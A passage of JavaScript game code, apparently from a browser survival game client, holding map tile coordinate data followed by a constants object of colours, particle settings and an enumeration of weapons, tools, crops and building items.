67, 36, 0], [1, "fo", 2, 45, 36, 0], [1, "fo", 2, 53, 34, 0], [1, "fo", 1, 51, 35, 0], [1, "fo", 1, 58, 35, 0], [1, "fo", 1, 33, 35, 0], [1, "fo", 1, 31, 33, 0], [1, "fo", 2, 29, 36, 0], [1, "fo", 2, 56, 36, 0], [1, "fo", 2, 60, 37, 0], [1, "fo", 2, 45, 32, 0], [1, "fo", 2, 22, 25, 0], [1, "fo", 2, 21, 35, 0], [1, "de", 52, 90, 208, 0], [1, "de", 18, 94, 250, 0], [1, "de", 17, 95, 253, 0], [1, "cs", 0, 140, 5, 1], [1, "cs", 2, 139, 5, 1], [1, "cs", 2, 138, 5, 1], [1, "cs", 2, 138, 6, 1], [1, "cs", 2, 139, 6, 1], [1, "cs", 2, 141, 6, 1], [1, "cs", 2, 140, 6, 1], [1, "la", 3, 143, 7, 1], [1, "la", 3, 139, 7, 1], [1, "cs", 0, 137, 7, 1], [1, "cs", 1, 138, 8, 1], [1, "cs", 2, 137, 6, 1], [1, "cs", 2, 137, 8, 1], [1, "cs", 2, 136, 7, 1], [1, "cs", 2, 138, 9, 1], [1, "cs", 3, 139, 9, 1], [1, "cs", 3, 136, 8, 1], [1, "cs", 3, 137, 9, 1], [1, "de", 53, 92, 165, 0], [1, "de", 53, 92, 180, 0], [1, "de", 53, 92, 188, 0], [1, "de", 54, 92, 153, 0], [1, "de", 54, 91, 153, 0], [1, "de", 54, 90, 153, 0], [1, "de", 54, 89, 153, 0], [1, "de", 54, 88, 153, 0], [1, "de", 54, 87, 153, 0], [1, "de", 54, 86, 153, 0], [1, "de", 54, 85, 153, 0], [1, "de", 54, 84, 153, 0], [1, "de", 54, 83, 153, 0], [1, "de", 54, 82, 153, 0], [1, "de", 54, 81, 153, 0], [1, "de", 54, 80, 153, 0], [1, "de", 54, 79, 153, 0], [1, "de", 54, 78, 153, 0], [1, "de", 54, 77, 153, 0], [1, "de", 54, 76, 153, 0], [1, "de", 54, 75, 153, 0], [1, "de", 54, 74, 153, 0], [1, "de", 54, 73, 153, 0], [1, "de", 54, 72, 153, 0], [1, "de", 54, 70, 153, 0], [1, "de", 54, 71, 153, 0], [1, "de", 54, 69, 153, 0], [1, "de", 54, 68, 153, 0], [1, "de", 54, 67, 153, 0], [1, "de", 54, 66, 153, 0], [1, "de", 54, 65, 153, 0], [1, "de", 54, 64, 153, 0], [1, "de", 54, 63, 153, 0], [1, "de", 54, 61, 153, 0], [1, "de", 54, 62, 153, 0], [1, "de", 54, 60, 153, 0], [1, "de", 54, 59, 153, 0], [1, "de", 54, 57, 153, 0], [1, "de", 54, 58, 153, 0], [1, "de", 54, 56, 153, 0], [1, "de", 54, 55, 153, 0], [1, "de", 54, 54, 153, 0], [1, "de", 54, 53, 153, 0], [1, "de", 54, 52, 153, 0], [1, "de", 54, 51, 153, 0], [1, "de", 54, 50, 153, 0], [1, "de", 54, 49, 153, 0], [1, "de", 54, 48, 153, 0], [1, "de", 54, 47, 153, 0], [1, "de", 54, 46, 153, 0], [1, "de", 54, 45, 153, 0], [1, "de", 54, 44, 153, 0], [1, "de", 54, 43, 153, 0], [1, "de", 54, 42, 153, 0], [1, "de", 54, 41, 153, 0], [1, "de", 54, 40, 153, 0], [1, "de", 54, 39, 153, 0], [1, "de", 54, 37, 153, 0], [1, "de", 54, 38, 153, 0], [1, "de", 54, 36, 153, 0], [1, "de", 54, 35, 153, 0], [1, "de", 54, 34, 153, 0], [1, "de", 54, 33, 153, 0], [1, "de", 54, 32, 153, 0], [1, "de", 54, 31, 153, 0], [1, "de", 54, 30, 153, 0], [1, "de", 54, 29, 153, 0], [1, "de", 54, 28, 153, 0], [1, "de", 54, 27, 153, 0], [1, "de", 54, 26, 153, 0], [1, "de", 54, 25, 153, 0], [1, "de", 54, 24, 153, 0], [1, "de", 54, 23, 153, 0], [1, "de", 54, 22, 153, 0], [1, "de", 54, 21, 153, 0], [1, "de", 54, 20, 153, 0], [1, "de", 54, 19, 153, 0], [1, "de", 54, 18, 153, 0], [1, "de", 54, 17, 153, 0], [1, "de", 54, 16, 153, 0], [1, "de", 54, 15, 153, 0], [1, "de", 54, 14, 153, 0], [1, "de", 54, 13, 153, 0], [1, "de", 54, 12, 153, 0], [1, "de", 54, 11, 153, 0], [1, "de", 54, 10, 153, 0], [1, "de", 54, 8, 153, 0], [1, "de", 54, 9, 153, 0], [1, "de", 55, 83, 8, 0], [1, "de", 55, 83, 9, 0], [1, "de", 55, 83, 10, 0], [1, "de", 55, 83, 11, 0], [1, "de", 55, 83, 12, 0], [1, "de", 55, 83, 13, 0], [1, "de", 55, 83, 14, 0], [1, "de", 55, 83, 15, 0], [1, "de", 55, 83, 16, 0], [1, "de", 55, 83, 17, 0], [1, "de", 55, 83, 19, 0], [1, "de", 55, 83, 18, 0], [1, "de", 55, 83, 20, 0], [1, "de", 55, 83, 21, 0], [1, "de", 55, 83, 22, 0], [1, "de", 55, 83, 23, 0], [1, "de", 55, 83, 24, 0], [1, "de", 55, 83, 25, 0], [1, "de", 55, 83, 26, 0], [1, "de", 55, 83, 27, 0], [1, "de", 55, 83, 28, 0], [1, "de", 55, 83, 29, 0], [1, "de", 55, 83, 30, 0], [1, "de", 55, 83, 31, 0], [1, "de", 55, 83, 32, 0], [1, "de", 55, 83, 33, 0], [1, "de", 55, 83, 34, 0], [1, "de", 55, 83, 36, 0], [1, "de", 55, 83, 35, 0], [1, "de", 55, 83, 37, 0], [1, "de", 55, 83, 38, 0], [1, "de", 55, 81, 38, 0], [1, "de", 55, 82, 38, 0], [1, "de", 55, 80, 38, 0], [1, "de", 55, 79, 38, 0], [1, "de", 55, 78, 38, 0], [1, "de", 55, 77, 38, 0], [1, "de", 55, 76, 38, 0], [1, "de", 55, 75, 38, 0], [1, "de", 55, 73, 38, 0], [1, "de", 55, 74, 38, 0], [1, "de", 55, 72, 38, 0], [1, "de", 55, 71, 38, 0], [1, "de", 55, 70, 38, 0], [1, "de", 55, 68, 38, 0], [1, "de", 55, 69, 38, 0], [1, "de", 55, 67, 38, 0], [1, "de", 55, 66, 38, 0], [1, "de", 55, 65, 38, 0], [1, "de", 55, 64, 38, 0], [1, "de", 55, 63, 38, 0], [1, "de", 55, 62, 38, 0], [1, "de", 55, 60, 38, 0], [1, "de", 55, 61, 38, 0], [1, "de", 55, 59, 38, 0], [1, "de", 55, 57, 38, 0], [1, "de", 55, 58, 38, 0], [1, "de", 55, 56, 38, 0], [1, "de", 55, 55, 38, 0], [1, "de", 55, 54, 38, 0], [1, "de", 55, 53, 38, 0], [1, "de", 55, 52, 38, 0], [1, "de", 55, 51, 38, 0], [1, "de", 55, 49, 38, 0], [1, "de", 55, 50, 38, 0], [1, "de", 55, 48, 38, 0], [1, "de", 55, 47, 38, 0], [1, "de", 55, 46, 38, 0], [1, "de", 55, 45, 38, 0], [1, "de", 55, 44, 38, 0], [1, "de", 55, 43, 38, 0], [1, "de", 55, 42, 38, 0], [1, "de", 55, 41, 38, 0], [1, "de", 55, 40, 38, 0], [1, "de", 55, 39, 38, 0], [1, "de", 55, 38, 38, 0], [1, "de", 55, 37, 38, 0], [1, "de", 55, 36, 38, 0], [1, "de", 55, 34, 38, 0], [1, "de", 55, 35, 38, 0], [1, "de", 55, 33, 38, 0], [1, "de", 55, 31, 38, 0], [1, "de", 55, 32, 38, 0], [1, "de", 55, 30, 38, 0], [1, "de", 55, 29, 38, 0], [1, "de", 55, 28, 38, 0], [1, "de", 55, 27, 38, 0], [1, "de", 55, 26, 38, 0], [1, "de", 55, 25, 38, 0], [1, "de", 55, 24, 38, 0], [1, "de", 55, 23, 38, 0], [1, "de", 55, 21, 38, 0], [1, "de", 55, 22, 38, 0], [1, "de", 55, 20, 38, 0], [1, "de", 55, 19, 38, 0], [1, "de", 55, 19, 37, 0], [1, "de", 55, 19, 36, 0], [1, "de", 55, 19, 35, 0], [1, "de", 55, 19, 34, 0], [1, "de", 55, 19, 33, 0], [1, "de", 55, 19, 32, 0], [1, "de", 55, 19, 31, 0], [1, "de", 55, 19, 30, 0], [1, "de", 55, 19, 28, 0], [1, "de", 55, 19, 29, 0], [1, "de", 55, 19, 27, 0], [1, "de", 55, 19, 26, 0], [1, "de", 55, 19, 25, 0], [1, "de", 55, 19, 24, 0], [1, "de", 55, 19, 23, 0], [1, "de", 55, 19, 22, 0], [1, "de", 55, 19, 21, 0], [1, "de", 55, 19, 20, 0], [1, "de", 55, 19, 18, 0], [1, "de", 55, 19, 19, 0], [1, "de", 55, 19, 16, 0], [1, "de", 55, 19, 17, 0], [1, "de", 55, 19, 15, 0], [1, "de", 55, 19, 14, 0], [1, "de", 55, 19, 13, 0], [1, "de", 55, 19, 12, 0], [1, "de", 55, 19, 11, 0], [1, "de", 55, 19, 10, 0], [1, "de", 55, 19, 9, 0], [1, "de", 55, 19, 8, 0], [1, "de", 55, 84, 35, 0], [1, "de", 55, 84, 32, 0], [1, "de", 55, 84, 25, 0], [1, "de", 50, 84, 24, 0], [1, "de", 55, 84, 20, 0], [1, "de", 55, 84, 17, 0], [1, "de", 55, 84, 16, 0], [1, "de", 50, 84, 15, 0], [1, "de", 55, 84, 8, 0], [1, "de", 55, 84, 9, 0], [1, "de", 50, 85, 11, 0], [1, "de", 55, 81, 39, 0], [1, "de", 50, 83, 40, 0], [1, "de", 55, 72, 39, 0], [1, "de", 55, 74, 39, 0], [1, "de", 55, 66, 39, 0], [1, "de", 55, 65, 39, 0], [1, "de", 50, 67, 41, 0], [1, "de", 55, 56, 39, 0], [1, "de", 55, 58, 39, 0], [1, "de", 55, 50, 39, 0], [1, "de", 50, 49, 39, 0], [1, "de", 55, 44, 39, 0], [1, "de", 55, 42, 39, 0], [1, "de", 50, 43, 39, 0], [1, "de", 50, 41, 39, 0], [1, "de", 50, 37, 39, 0], [1, "de", 55, 36, 39, 0], [1, "de", 55, 32, 39, 0], [1, "de", 50, 31, 39, 0], [1, "de", 55, 23, 39, 0], [1, "de", 55, 18, 37, 0], [1, "de", 50, 18, 36, 0], [1, "de", 55, 18, 35, 0], [1, "de", 50, 18, 34, 0], [1, "de", 55, 18, 31, 0], [1, "de", 50, 18, 30, 0], [1, "de", 55, 18, 25, 0], [1, "de", 50, 18, 24, 0], [1, "de", 55, 18, 20, 0], [1, "de", 55, 18, 14, 0], [1, "de", 50, 18, 15, 0], [1, "de", 55, 18, 8, 0], [1, "de", 54, 90, 154, 0], [1, "de", 51, 89, 154, 0], [1, "de", 54, 85, 154, 0], [1, "de", 54, 81, 154, 0], [1, "de", 54, 76, 154, 0], [1, "de", 54, 70, 154, 0], [1, "de", 54, 66, 154, 0], [1, "de", 54, 61, 154, 0], [1, "de", 54, 56, 154, 0], [1, "de", 54, 53, 154, 0], [1, "de", 54, 45, 154, 0], [1, "de", 54, 42, 154, 0], [1, "de", 54, 37, 154, 0], [1, "de", 54, 30, 154, 0], [1, "de", 54, 25, 154, 0], [1, "de", 54, 17, 154, 0], [1, "de", 54, 10, 154, 0], [1, "de", 54, 8, 154, 0], [1, "de", 55, 20, 9, 0], [1, "de", 53, 93, 154, 0], [1, "de", 53, 93, 156, 0], [1, "de", 53, 93, 158, 0], [1, "de", 52, 91, 157, 0], [1, "de", 53, 93, 159, 0], [1, "de", 53, 93, 161, 0], [1, "de", 53, 93, 162, 0], [1, "de", 53, 93, 163, 0], [1, "de", 53, 93, 164, 0], [1, "de", 53, 93, 165, 0], [1, "de", 53, 93, 166, 0], [1, "de", 53, 93, 167, 0], [1, "de", 52, 91, 167, 0], [1, "de", 53, 93, 169, 0], [1, "de", 53, 93, 168, 0], [1, "de", 53, 93, 170, 0], [1, "de", 53, 93, 171, 0], [1, "de", 53, 93, 173, 0], [1, "de", 53, 93, 176, 0], [1, "de", 53, 93, 175, 0], [1, "de", 53, 92, 169, 0], [1, "de", 53, 93, 178, 0], [1, "de", 53, 93, 179, 0], [1, "de", 53, 93, 180, 0], [1, "de", 53, 93, 181, 0], [1, "de", 53, 93, 183, 0], [1, "de", 53, 93, 184, 0], [1, "de", 53, 93, 186, 0], [1, "de", 18, 95, 185, 0], [1, "de", 53, 93, 187, 0], [1, "de", 53, 93, 188, 0], [1, "de", 52, 91, 186, 0], [1, "de", 53, 93, 190, 0], [1, "de", 53, 93, 192, 0], [1, "de", 53, 93, 195, 0], [1, "de", 53, 93, 194, 0], [1, "de", 52, 91, 196, 0], [1, "de", 53, 93, 197, 0], [1, "de", 53, 93, 200, 0], [1, "de", 53, 93, 198, 0], [1, "de", 53, 93, 201, 0], [1, "de", 53, 93, 202, 0], [1, "de", 53, 93, 203, 0], [1, "de", 53, 93, 204, 0], [1, "de", 53, 93, 206, 0], [1, "de", 53, 93, 205, 0], [1, "de", 53, 93, 207, 0], [1, "de", 53, 93, 209, 0], [1, "de", 53, 93, 210, 0], [1, "de", 53, 93, 212, 0], [1, "de", 52, 91, 204, 0], [1, "de", 53, 93, 213, 0], [1, "de", 53, 93, 214, 0], [1, "de", 53, 93, 215, 0], [1, "de", 53, 93, 216, 0], [1, "de", 53, 93, 217, 0], [1, "de", 53, 93, 218, 0], [1, "de", 53, 93, 219, 0], [1, "de", 53, 93, 220, 0], [1, "de", 52, 92, 213, 0], [1, "de", 52, 92, 206, 0], [1, "de", 52, 92, 202, 0], [1, "de", 53, 92, 201, 0], [1, "de", 52, 92, 194, 0], [1, "de", 52, 92, 178, 0], [1, "de", 52, 92, 171, 0], [1, "de", 53, 93, 221, 0], [1, "de", 53, 93, 222, 0], [1, "de", 53, 93, 223, 0], [1, "de", 53, 93, 225, 0], [1, "de", 53, 93, 228, 0], [1, "de", 53, 93, 227, 0], [1, "de", 52, 92, 217, 0], [1, "de", 53, 92, 218, 0], [1, "de", 52, 92, 221, 0], [1, "de", 52, 92, 225, 0], [1, "de", 52, 93, 226, 0], [1, "de", 52, 93, 224, 0], [1, "de", 52, 93, 208, 0], [1, "de", 52, 93, 211, 0], [1, "de", 52, 93, 196, 0], [1, "de", 52, 93, 199, 0], [1, "de", 52, 93, 189, 0], [1, "de", 52, 93, 191, 0], [1, "de", 52, 93, 193, 0], [1, "de", 52, 93, 182, 0], [1, "de", 52, 93, 185, 0], [1, "de", 52, 93, 172, 0], [1, "de", 52, 93, 174, 0], [1, "de", 52, 93, 177, 0], [1, "de", 52, 93, 155, 0], [1, "de", 52, 93, 157, 0], [1, "de", 52, 93, 160, 0], [1, "de", 52, 92, 162, 0], [1, "de", 53, 93, 229, 0], [1, "de", 53, 93, 231, 0], [1, "de", 53, 93, 232, 0], [1, "de", 53, 93, 234, 0], [1, "de", 52, 93, 230, 0], [1, "de", 52, 92, 228, 0], [1, "de", 53, 93, 235, 0], [1, "de", 53, 93, 236, 0], [1, "de", 53, 93, 237, 0], [1, "de", 53, 93, 239, 0], [1, "de", 53, 93, 240, 0], [1, "de", 52, 93, 238, 0], [1, "de", 53, 93, 241, 0], [1, "de", 52, 93, 242, 0], [1, "de", 52, 93, 243, 0], [1, "de", 53, 93, 244, 0], [1, "de", 53, 93, 246, 0], [1, "de", 53, 93, 245, 0], [1, "de", 52, 93, 247, 0], [1, "de", 53, 93, 248, 0], [1, "de", 52, 92, 235, 0], [1, "de", 52, 92, 245, 0], [1, "de", 52, 93, 249, 0], [1, "de", 53, 93, 250, 0], [1, "de", 53, 93, 251, 0], [1, "de", 53, 93, 252, 0], [1, "de", 53, 93, 254, 0], [1, "de", 52, 93, 253, 0], [1, "de", 52, 93, 255, 0], [1, "de", 53, 93, 257, 0], [1, "de", 53, 93, 256, 0], [1, "de", 52, 93, 258, 0], [1, "de", 53, 93, 259, 0], [1, "de", 52, 93, 260, 0], [1, "de", 53, 93, 263, 0], [1, "de", 53, 93, 264, 0], [1, "de", 53, 93, 265, 0], [1, "de", 52, 93, 266, 0], [1, "de", 53, 93, 267, 0], [1, "de", 52, 93, 268, 0], [1, "de", 52, 93, 269, 0], [1, "de", 53, 93, 276, 0], [1, "de", 53, 93, 277, 0], [1, "de", 52, 93, 278, 0], [1, "de", 53, 93, 279, 0], [1, "de", 52, 93, 280, 0], [1, "de", 52, 93, 283, 0], [1, "de", 53, 93, 284, 0], [1, "de", 53, 93, 285, 0], [1, "de", 53, 93, 286, 0], [1, "de", 52, 93, 287, 0], [1, "de", 53, 93, 288, 0], [1, "de", 53, 93, 289, 0], [1, "de", 52, 93, 290, 0], [1, "de", 52, 93, 291, 0], [1, "de", 53, 93, 292, 0], [1, "de", 52, 93, 293, 0], [1, "de", 53, 93, 294, 0], [1, "de", 52, 93, 295, 0], [1, "de", 52, 93, 296, 0], [1, "de", 53, 93, 297, 0], [1, "de", 53, 93, 298, 0], [1, "de", 52, 93, 299, 0], [1, "de", 53, 93, 300, 0], [1, "de", 52, 92, 298, 0], [1, "de", 52, 92, 293, 0], [1, "r", 92, 262, 0], [1, "r", 93, 262, 0], [1, "de", 52, 93, 261, 0], [1, "cs", 0, 223, 104, 1], [1, "cs", 2, 223, 105, 1], [1, "cs", 2, 223, 102, 1], [1, "cs", 2, 223, 103, 1], [1, "la", 3, 141, 8, 1], [1, "cs", 2, 140, 9, 1], [1, "la", 4, 142, 9, 1], [1, "de", 4, 81, 149, 0], [1, "f", 0, 83, 148, 1], [1, "f", 1, 82, 149, 1], [1, "de", 34, 81, 156, 0], [1, "de", 51, 17, 9, 0], [1, "de", 54, 16, 9, 0], [1, "de", 54, 15, 9, 0], [1, "cs", 3, 223, 106, 1], [1, "p", 0, 119, 279, 1], [1, "p", 0, 109, 242, 1], [1, "cs", 1, 29, 9, 1], [1, "cs", 2, 30, 9, 1], [1, "cs", 2, 31, 9, 1], [1, "cs", 2, 32, 9, 1], [1, "cs", 2, 33, 9, 1], [1, "cs", 2, 69, 9, 1], [1, "cs", 2, 71, 9, 1], [1, "cs", 2, 70, 9, 1], [1, "cs", 1, 72, 9, 1], [1, "cs", 2, 73, 9, 1], [1, "de", 10, 31, 10, 0], [1, "de", 10, 29, 10, 0], [1, "de", 10, 44, 10, 0], [1, "de", 4, 87, 10, 0], [1, "de", 4, 86, 10, 0], [1, "de", 5, 87, 9, 0], [1, "de", 5, 13, 10, 0], [1, "de", 4, 14, 11, 0], [1, "de", 4, 16, 10, 0], [1, "de", 4, 17, 10, 0], [1, "cs", 2, 146, 9, 1], [1, "cs", 2, 148, 9, 1], [1, "cs", 2, 150, 9, 1], [1, "cs", 2, 153, 9, 1], [1, "cs", 2, 155, 9, 1], [1, "cs", 1, 149, 9, 1], [1, "cs", 1, 154, 9, 1], [1, "cs", 3, 147, 9, 1], [1, "cs", 3, 151, 9, 1], [1, "cs", 3, 152, 9, 1], [1, "cs", 3, 156, 9, 1], [1, "cs", 3, 157, 9, 1], [1, "cs", 3, 158, 9, 1], [1, "cs", 3, 159, 9, 1], [1, "cs", 3, 160, 9, 1], [1, "cs", 0, 161, 9, 1], [1, "cs", 2, 162, 9, 1], [1, "cs", 2, 163, 9, 1], [1, "cs", 1, 164, 9, 1], [1, "cs", 2, 165, 9, 1], [1, "cs", 3, 166, 9, 1], [1, "cs", 3, 168, 9, 1], [1, "cs", 3, 170, 9, 1], [1, "cs", 1, 169, 9, 1], [1, "cs", 2, 167, 9, 1], [1, "cs", 2, 171, 9, 1], [1, "cs", 2, 173, 9, 1], [1, "cs", 2, 172, 9, 1], [1, "cs", 2, 174, 9, 1], [1, "cs", 1, 175, 9, 1], [1, "cs", 3, 176, 9, 1], [1, "cs", 3, 178, 9, 1], [1, "cs", 3, 179, 9, 1], [1, "cs", 0, 180, 9, 1], [1, "cs", 2, 177, 9, 1], [1, "cs", 2, 182, 9, 1], [1, "cs", 2, 181, 9, 1], [1, "cs", 2, 183, 9, 1], [1, "cs", 2, 184, 9, 1], [1, "cs", 2, 185, 9, 1], [1, "cs", 2, 186, 9, 1], [1, "cs", 1, 187, 9, 1], [1, "cs", 2, 188, 9, 1], [1, "cs", 3, 189, 9, 1], [1, "cs", 3, 190, 9, 1], [1, "cs", 3, 191, 9, 1], [1, "cs", 2, 192, 9, 1], [1, "cs", 0, 193, 9, 1], [1, "cs", 2, 194, 9, 1], [1, "cs", 2, 196, 9, 1], [1, "cs", 2, 198, 9, 1], [1, "cs", 2, 200, 9, 1], [1, "cs", 3, 195, 9, 1], [1, "cs", 3, 197, 9, 1], [1, "cs", 3, 199, 9, 1], [1, "cs", 0, 201, 9, 1], [1, "cs", 2, 202, 9, 1], [1, "cs", 2, 203, 9, 1], [1, "cs", 3, 208, 9, 1], [1, "cs", 3, 207, 9, 1], [1, "cs", 3, 206, 9, 1], [1, "cs", 3, 205, 9, 1], [1, "cs", 3, 204, 9, 1], [1, "cs", 3, 214, 9, 1], [1, "cs", 3, 215, 9, 1], [1, "cs", 3, 216, 9, 1], [1, "cs", 3, 217, 9, 1], [1, "cs", 3, 218, 9, 1], [1, "b", 0, 5, 159, 0], [1, "b", 0, 5, 171, 0], [2, "isl", 1, 122, 63, 0], [2, "isl", 2, 119, 277, 0], [2, "isl", 2, 109, 244, 0], [2, "isl", 2, 114, 205, 0], [2, "isl", 1, 120, 150, 0], [2, "isl", 2, 154, 129, 0], [2, "isl", 0, 184, 158, 0], [2, "isl", 1, 208, 128, 0], [2, "isl", 1, 215, 132, 0], [2, "isl", 1, 214, 128, 0], [2, "isl", 1, 209, 132, 0], [1, "la", 3, 217, 20, 1], [1, "la", 1, 215, 19, 1], [1, "la", 0, 212, 18, 1], [1, "la", 4, 214, 18, 1], [1, "la", 4, 216, 19, 1], [1, "la", 4, 211, 20, 1], [1, "la", 3, 210, 19, 1], [1, "la", 3, 215, 21, 1], [1, "la", 1, 214, 20, 1], [1, "la", 3, 214, 22, 1], [1, "la", 3, 214, 24, 1], [1, "la", 4, 214, 26, 1], [1, "la", 4, 213, 27, 1], [1, "la", 1, 212, 28, 1], [1, "la", 2, 212, 29, 1], [1, "la", 5, 212, 30, 1], [1, "la", 4, 208, 19, 1], [1, "la", 4, 207, 19, 1], [1, "la", 1, 206, 19, 1], [1, "la", 1, 205, 19, 1], [1, "la", 2, 204, 19, 1], [1, "la", 5, 203, 19, 1], [1, "la", 3, 210, 17, 1]];
    var he = 0;
    var Ie = {
      GROUND: ["#133A2B", "#042b30"],
      SNOW_GROUND: ["#EBF2F0", "#136167"],
      CRAFT_LOADING: ["#4EB687", "#187484"],
      BROWN_LIFE: ["#664516", "#13474C"],
      SAND_COLOR: ["#FCEFBB", "#0F4D48"],
      SAND_SHOVEL_CO: ["#C1AA7E", "#0F423D"],
      GRD_SHOVEL_CO: ["#594837", "#163A3A"],
      ICE_SHOVEL_CO: ["#A5D6D6", "#539CA0"],
      WATER_3_COLOR: ["#0B6A84", "#09373F"],
      WATER_2_COLOR: ["#2A8B9B", "#0F464C"],
      WATER_1_COLOR: ["#A9D6D3", "#115E60"],
      FLOAM_COLOR: ["#ECF7F9", "#539CA0"],
      WEAPON_LOADING: ["#FFF", "#FFF"],
      HELMET_LOADING: ["#FFF", "#FFF"],
      SWIM_COLOR: ["#1C9BA4", "#00272F"],
      LAVA_GROUND: ["#2D2017", "#031C1E"],
      DAY: 0,
      NIGHT: 1,
      DRAGON_DEN_X: 2300,
      DRAGON_DEN_Y: 2290,
      FLAKES_NUMBER: 34,
      FLAKES_SIZES: 5,
      SAND_NUMBER: 68,
      ASHES_NUMBER: 34,
      ASHES_SIZES: 5,
      SMOG: 1,
      SMOG_PUSH: 0.6,
      SMOG_SPEED: 0.25,
      STEP_SPACE: 50,
      TRAIL_SPACE: 10,
      SWIM_SPACE: 75,
      GHOST_BUBBLES: 20,
      BUBBLES_SIZES: 5,
      SWORD: he++,
      PICK: he++,
      FUR: he++,
      PICK_GOLD: he++,
      PICK_DIAMOND: he++,
      SWORD_GOLD: he++,
      SWORD_DIAMOND: he++,
      HAND: he++,
      PICK_WOOD: he++,
      PIRATE_SWORD: he++,
      EARMUFFS: he++,
      COAT: he++,
      WOOD_SPEAR: he++,
      SPEAR: he++,
      GOLD_SPEAR: he++,
      DIAMOND_SPEAR: he++,
      DRAGON_SPEAR: he++,
      LAVA_SPEAR: he++,
      CRAB_SPEAR: he++,
      REIDITE_SWORD: he++,
      DIAMOND_PROTECTION: he++,
      AMETHYST_PROTECTION: he++,
      REIDITE_PROTECTION: he++,
      EXPLORER_HAT: he++,
      PIRATE_HAT: he++,
      STONE_HELMET: he++,
      GOLD_HELMET: he++,
      DIAMOND_HELMET: he++,
      BOOK: he++,
      BAG: he++,
      SWORD_AMETHYST: he++,
      PICK_AMETHYST: he++,
      PICK_REIDITE: he++,
      AMETHYST_SPEAR: he++,
      REIDITE_SPEAR: he++,
      HAMMER: he++,
      HAMMER_GOLD: he++,
      HAMMER_DIAMOND: he++,
      HAMMER_AMETHYST: he++,
      HAMMER_REIDITE: he++,
      CAP_SCARF: he++,
      CHRISTMAS_HAT: he++,
      ELF_HAT: he++,
      AMETHYST_HELMET: he++,
      REIDITE_HELMET: he++,
      SUPER_HAMMER: he++,
      SHOVEL: he++,
      SUPER_DIVING_SUIT: he++,
      DIVING_MASK: he++,
      WATERING_CAN_FULL: he++,
      SHOVEL_GOLD: he++,
      SHOVEL_DIAMOND: he++,
      SHOVEL_AMETHYST: he++,
      PITCHFORK: he++,
      PITCHFORK2: he++,
      SPANNER: he++,
      MACHETE: he++,
      SWORD_WOOD: he++,
      WOOD_HELMET: he++,
      DRAGON_HELMET: he++,
      LAVA_HELMET: he++,
      CROWN_CRAB: he++,
      DRAGON_SWORD: he++,
      LAVA_SWORD: he++,
      WOOD_BOW: he++,
      STONE_BOW: he++,
      GOLD_BOW: he++,
      DIAMOND_BOW: he++,
      AMETHYST_BOW: he++,
      REIDITE_BOW: he++,
      DRAGON_BOW: he++,
      WOOD_SHIELD: he++,
      STONE_SHIELD: he++,
      GOLD_SHIELD: he++,
      DIAMOND_SHIELD: he++,
      AMETHYST_SHIELD: he++,
      REIDITE_SHIELD: he++,
      CROWN_GREEN: he++,
      CROWN_ORANGE: he++,
      CROWN_BLUE: he++,
      TURBAN1: he++,
      TURBAN2: he++,
      PILOT_HELMET: he++,
      HOOD: he++,
      PEASANT: he++,
      WINTER_HOOD: he++,
      WINTER_PEASANT: he++,
      FLOWER_HAT: he++,
      FUR_HAT: he++,
      SADDLE: he++,
      WITCH: he++,
      NIMBUS: he++,
      WAND1: he++,
      WAND2: he++,
      FIREFLY_ITEM: he++,
      WOOD_ARROW: he++,
      STONE_ARROW: he++,
      GOLD_ARROW: he++,
      DIAMOND_ARROW: he++,
      AMETHYST_ARROW: he++,
      REIDITE_ARROW: he++,
      DRAGON_ARROW: he++,
      STONES: he++,
      TREE: he++,
      PLANT: he++,
      GOLD: he++,
      DIAMOND: he++,
      WOOD_FIRE: he++,
      WORKBENCH: he++,
      PLANT_SEED: he++,
      MEAT: he++,
      COOKED_MEAT: he++,
      BIG_FIRE_WOOD: he++,
      FURNACE_OFF: he++,
      PAPER: he++,
      AMETHYST: he++,
      AMETHYST_WALL: he++,
      AMETHYST_SPIKE: he++,
      DOOR_AMETHYST_CLOSE: he++,
      BRIDGE: he++,
      SAND: he++,
      BOTTLE_FULL: he++,
      BOTTLE_EMPTY: he++,
      KRAKEN_SKIN: he++,
      WATERING_CAN: he++,
      FLOUR: he++,
      WHEAT_SEED: he++,
      COOKIE: he++,
      WILD_WHEAT: he++,
      WINDMILL: he++,
      CAKE: he++,
      FOODFISH: he++,
      FOODFISH_COOKED: he++,
      SCALES: he++,
      INV_GROUND: he++,
      PLOT: he++,
      INV_ICE: he++,
      INV_BREAD: he++,
      BREAD_OVEN_OFF: he++,
      INV_SANDWICH: he++,
      FUR_WINTER: he++,
      BLUE_CORD: he++,
      LOCK: he++,
      DRAGON_HEART: he++,
      LAVA_HEART: he++,
      RESURRECTION: he++,
      EMERALD_MACHINE: he++,
      EXTRACTOR_MACHINE_STONE: he++,
      EXTRACTOR_MACHINE_GOLD: he++,
      EXTRACTOR_MACHINE_DIAMOND: he++,
      EXTRACTOR_MACHINE_AMETHYST: he++,
      EXTRACTOR_MACHINE_REIDITE: he++,
      LOCKPICK: he++,
      TOTEM: he++,
      SPIKE: he++,
      CORD: he++,
      WALL: he++,
      STONE_WALL: he++,
      GOLD_WALL: he++,
      DIAMOND_WALL: he++,
      DOOR_WOOD_CLOSE: he++,
      CHEST: he++,
      STONE_SPIKE: he++,
      GOLD_SPIKE: he++,
      DIAMOND_SPIKE: he++,
      DOOR_STONE_CLOSE: he++,
      DOOR_GOLD_CLOSE: he++,
      DOOR_DIAMOND_CLOSE: he++,
      FUR_WOLF: he++,
      INV_GEMME_BLUE: he++,
      INV_GEMME_GREEN: he++,
      INV_GEMME_ORANGE: he++,
      INV_SPECIAL_FUR: he++,
      INV_SPECIAL_FUR_2: he++,
      INV_BUCKET_FULL: he++,
      INV_BUCKET_EMPTY: he++,
      WELL_EMPTY: he++,
      SIGN: he++,
      DRAGON_CUBE: he++,
      DRAGON_ORB: he++,
      LAVA_CUBE: he++,
      LAVA_ORB: he++,
      PLANT_PUMPKIN: he++,
      PUMPKIN: he++,
      ROOF: he++,
      PLANT_GARLIC: he++,
      GARLIC: he++,
      PLANT_THORNBUSH: he++,
      THORNBUSH: he++,
      BANDAGE: he++,
      INV_CRAB_STICK: he++,
      INV_CRAB_LOOT: he++,
      BED: he++,
      SUGAR_CAN: he++,
      INV_CANDY: he++,
      GARLAND: he++,
      REIDITE: he++,
      MAGMA: he++,
      PLANT_CARROT: he++,
      CARROT: he++,
      PLANT_TOMATO: he++,
      TOMATO: he++,
      PLANT_WATERMELON: he++,
      WATERMELON: he++,
      PLANT_ALOE_VERA: he++,
      ALOE_VERA_GROWN: he++,
      WOOD_DOOR_SPIKE: he++,
      STONE_DOOR_SPIKE: he++,
      GOLD_DOOR_SPIKE: he++,
